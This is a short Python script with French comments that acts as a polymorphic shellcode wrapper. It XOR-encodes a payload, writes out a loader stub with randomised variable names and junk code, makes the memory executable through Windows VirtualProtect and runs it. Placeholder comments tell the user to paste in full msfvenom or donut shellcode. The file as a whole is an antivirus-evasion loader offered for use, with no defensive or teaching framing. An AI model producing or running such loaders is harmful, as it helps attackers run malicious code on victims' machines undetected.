# Polymorphic shellcode wrapper — Python 3.10+ stdlib only
# XOR encode + stub generation avec noms de vars randomisés
import os, random, string

def xor_encode(shellcode: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(shellcode))

def rvar(n: int = 8) -> str:
    pool = string.ascii_lowercase
    return random.choice(pool) + "".join(random.choices(pool, k=n-1))

def generate_stub(encoded: bytes, key: bytes) -> str:
    ve, vk, vd, vb = rvar(), rvar(), rvar(), rvar()
    junk = "\n".join(f"    {rvar()} = {random.randint(0, 0xFFFF)}" for _ in range(4))
    return f"""import ctypes
{ve} = {list(encoded)}
{vk} = {list(key)}
{junk}
{vd} = bytes(b ^ {vk}[i % len({vk})] for i, b in enumerate({ve}))
{vb} = ctypes.create_string_buffer({vd}, len({vd}))
_p = ctypes.cast({vb}, ctypes.c_void_p)
_o = ctypes.c_ulong(0)
ctypes.windll.kernel32.VirtualProtect(_p, len({vd}), 0x40, ctypes.byref(_o))
ctypes.cast({vb}, ctypes.CFUNCTYPE(ctypes.c_void_p))()
"""

# FILL: remplace DEMO_SC par ton shellcode complet (msfvenom/donut)
DEMO_SC = bytes([0xfc, 0x48, 0x83, 0xe4, 0xf0])
key     = os.urandom(random.randint(8, 32))
encoded = xor_encode(DEMO_SC, key)
stub    = generate_stub(encoded, key)
with open("poly_stub_out.py", "w") as f:
    f.write(stub)
print(f"[+] stub → poly_stub_out.py | clé: {key.hex()}")
print("[!] FILL: colle ton shellcode complet dans DEMO_SC")
    